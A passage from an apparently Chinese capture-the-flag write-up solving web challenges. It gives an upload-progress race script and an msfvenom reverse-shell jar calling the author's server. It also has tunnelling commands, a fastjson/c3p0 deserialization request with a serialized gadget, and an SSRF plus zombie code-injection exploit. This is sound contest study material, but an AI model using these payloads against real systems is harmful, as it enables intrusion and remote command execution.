punctuation">)</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> PAYLOAD<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'123.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                            timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> getdir<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'123.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+++++++++++++]retry"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>打了phpinfo发现可行</p><img src="/article/2021xyb/upload_22a92f54497d73c2f65e6f34c6dba9b6.png" class="" title="img" loading="lazy"><p>继续</p><img src="/article/2021xyb/upload_00c55368090301064d2ed35507ff9685.png" class="" title="img" loading="lazy"><p>读取根目录下文件</p><img src="/article/2021xyb/upload_4e9b7ae5eef86856696a48d5cceda801.png" class="" title="img" loading="lazy"><p>执行<code>/getflag.sh</code></p><img src="/article/2021xyb/image-20210903140536843.png" class="" title="image-20210903140536843" loading="lazy"><p>拿到flag</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>赛后和 @h3h3QAQ 师傅聊了下，发现waf是可以绕过的（tqltql）</p><p>直接用反斜线绕过,payload:<code>./?u=&lt;?=system(&#39;gerf\lag.sh&#39;);?&gt;</code></p><img src="/article/2021xyb/image-20210903140902197.png" class="" title="image-20210903140902197" loading="lazy"><p>然后预览得到flag</p><img src="/article/2021xyb/image-20210903141054059.png" class="" title="image-20210903141054059" loading="lazy"><p>太猛了</p><hr><h3 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h3><p>Apache Flink老洞了<a href="https://www.freebuf.com/vuls/220252.html">https://www.freebuf.com/vuls/220252.html</a></p><p>利用msf生成个jar包</p><p><code> msfvenom -p java/shell_reverse_tcp LHOST=vps LPORT=1234 -f jar&gt;/media/psf/Home/Downloads/shell.jar</code></p><p>直接upload然后submit上线</p><p>题目说本机对应内网<code>10.10.1.12</code>，扫了<code>10.10.1.11</code> 的8080端口好像有东西</p><h4 id="利用ew内网穿透"><a href="#利用ew内网穿透" class="headerlink" title="利用ew内网穿透"></a>利用ew内网穿透</h4><p>利用ew内网穿透出来，放公网服务器，在靶机上用curl -O保存ew文件，然后执行，公网vps上转发流量</p><p>本人的描述可能有错误或不清楚的地方，还请师傅们多多指教</p><h5 id="公网主机"><a href="#公网主机" class="headerlink" title="公网主机"></a>公网主机</h5><p>如下，执行<code>./ew -s lcx_listen -l 1080 -e 8888</code> 将本机1080的流量转交到8888</p><img src="/article/2021xyb/image-20210903141554948.png" class="" title="image-20210903141554948" loading="lazy"><hr><h5 id="边界主机"><a href="#边界主机" class="headerlink" title="边界主机"></a>边界主机</h5><p>执行<code>./ew -s lcx_slave -d [vps] -e [port] -f 10.10.1.11 -g 8080</code></p><p>利用可控的内网主机打通<code>10.10.1.11:8080</code> 与我们公网vps的通讯隧道</p><img src="/article/2021xyb/image-20210903142010256.png" class="" title="image-20210903142010256" loading="lazy"><h4 id="网络状况描述"><a href="#网络状况描述" class="headerlink" title="网络状况描述"></a>网络状况描述</h4><p>· 本机：即我的攻击电脑</p><p>· 可控的公网IP主机：即我的在公网的服务器</p><p>· A主机：题目给出的靶机，有公网IP：47.104.135.101，内网IP：10.10.1.12，可访问B主机</p><p>· B主机：题目内网的目标靶机，8080端口有东西</p><p>目标：访问B主机的8080端口</p><pre class="language-none"><code class="language-none">                    一台可控公网IP主机                    可控内网主机A                      主机B+---------+     +----------------------+    |    +-------------------------+      +-------------------+|   本机   | -&gt;&gt; | 1080 -&gt;  vps -&gt; 8888 |  防火墙  | &lt;--    10.10.1.12   --&gt; | -&gt;&gt; | 8080 -&gt; 10.10.1.11 |+---------+     +----------------------+    |    +-------------------------+      +-------------------+</code></pre><hr><p>访问到了<code>10.10.1.11:8080</code></p><p>将题目附件的<code>web.jar</code> 反编译下，拿到了源码。</p><p>首先在<code>/doLogin</code> 路由登陆，审查源码得知 <code>用户名/密码</code> 分别为 <code>admin/123456</code> </p><p>然后拿到cookie转去<code>/admin/test</code>路由</p><p>根据源码，这里会先过waf然后解析json，而且json长度要大于20000</p><p>在github上找到了一份payload：<a href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p><p>fastjson-c3p0不出网回显利用，直接生成payload，然后复制几遍达到长度要求，改Content-Type为json，在header中添加cmd命令，获得flag</p><img src="/article/2021xyb/4D49F7AE6BBF284F438626001021582E.jpg" class="" title="4D49F7AE6BBF284F438626001021582E" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;test HTTP&#x2F;1.1Host: 49.234.89.193:1080Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeCookie: JSESSIONID&#x3D;20337391D87A73966C86012AB6114638;Content-Type: application&#x2F;jsoncmd: cat &#x2F;flagContent-Length: 79583&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;&#125;,&quot;（把上面两段再复制两遍）&#125;</code></pre><h3 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h3><p>观察 /user/profile 和 /user/verify 路由可知，profile 在处理 bucket 的更新时是先进行了更新再生成了 token。</p><p>而 verify 仅仅判断了库中是否存在所提交的 token 并且其 valid 为 true。</p><p>那么此时即存在了一个逻辑漏洞，先正常提交一次 bucket 更新，使得程序写入一个可行的 token，然后再次请求 profile 更新 bucket 为 SSRF 的值。使用第一次得到的 token 对第二次的恶意 bucket 进行 verify，从而成功达成 SSRF。由于此时的 bucket 被进行了如下校验。</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">static</span> <span class="token function">checkBucket</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"http:"</span> <span class="token operator">&amp;&amp;</span> url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"https:"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'oss-cn-beijing.ichunqiu.com'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>因此我们构造链接的形式被迫变为 <a href="http://host/#oss-cn-beijing.ichunqiu.com">http://HOST#oss-cn-beijing.ichunqiu.com</a>  也就是说我们只能使用指定协议。</p><p>此时可以使用 302 跳转进行绕过，在服务器上写如下 PHP 代码来进行跳转，从而达成任意文件读取。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: file:///readflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>此时再提交链接后访问 /bucket 路由即可触发一次访问。而访问所返回的内容则是根目录下 /readflag 的内容。</p><p>结合题目的提示可知我们需要 RCE，而读取到了 /readflag 则指明了方向。此时可以发现程序使用了 zombie 进行了访问，因此可以采用 zombie code injection 来进行 RCE，进而带出 flag。</p><p>公网vps写入：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"return(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 22, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> randombaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zedk1cbvvahhu2yuuyl.cloudeci1.ichunqiu.com:8888/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">"user/verify?token=%s"</span> <span class="token operator">%</span> token<span class="token punctuation">)</span>    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signup"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">"password_confirm"</span><span class="token punctuation">:</span> password    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header).text)</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"regist"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signin"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header))</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/profile"</span>    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> <span class="token string">"https://895cdc8a2e67bbb23b5e6335fca98bc2.oss-cn-beijing.ichunqiu.com/"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment"># print(res)</span>        token <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"?token="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> payload<span class="token operator">+</span><span class="token string">"#oss-cn-beijing.ichunqiu.com"</span>    <span class="token punctuation">&#125;</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/bucket"</span>    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\n"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    register<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    login<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token comment"># modify("http://vps/test.php?1=file:///flag")</span>    modify<span class="token punctuation">(</span><span class="token string">"http://vps/test3.php"</span><span class="token punctuation">)</span>    view<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h3 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h3><p>先看database.ts，直接给出账号密码，<code>admin/e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</code>,同时还有flag的sum值</p><p>flag在file/flag中，审查代码发现我们要<strong>不是</strong>superuser<strong>且是</strong>admin才可以获取file下的文件，superuser被ban了</p><p>看<code>/</code>路由，由于database只要一个admin用户，所以直接登录，就是<code>isadmin</code>为true了</p><p>重定向到<code>/admin</code>路由，get方法没啥好说的，如果属于user的文件存在就写入cookie。 </p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> files <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">listFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token 